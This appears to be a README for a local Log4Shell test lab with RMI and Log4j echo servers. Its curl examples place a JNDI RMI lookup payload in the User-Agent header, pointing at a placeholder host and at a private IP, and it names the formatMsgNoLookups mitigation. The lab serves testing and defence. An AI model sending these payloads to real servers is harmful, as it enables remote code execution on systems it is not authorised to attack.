## server list
* SimpleRmiServer
  * port : 1234
  * health check : http://localhost:1234/healthcheck
* SimpleRmiClient
  * port : 4321
  * health check : http://localhost:4321/healthcheck
  * application runner invoke rmi hello service method
* SimpleLog4jEchoServer
  * port : 8080
  * health check : http://localhost:8080/healthcheck

## log4shell test
``` shell
$ curl -v -X GET \
--header 'User-Agent: ${jndi:rmi://yourIPAddress:10999/HelloService}' \
http://localhost:8080/doService/wow

# my example
$ curl -v -X GET \
--header 'User-Agent: ${jndi:rmi://192.168.1.6:10999/HelloService}' \
http://localhost:8080/doService/wow
```
* log4j call `jndi:rmi://yourIPAddress:10999/HelloService`
* with `-Dlog4j2.formatMsgNoLookups=true` option prevent log4shell
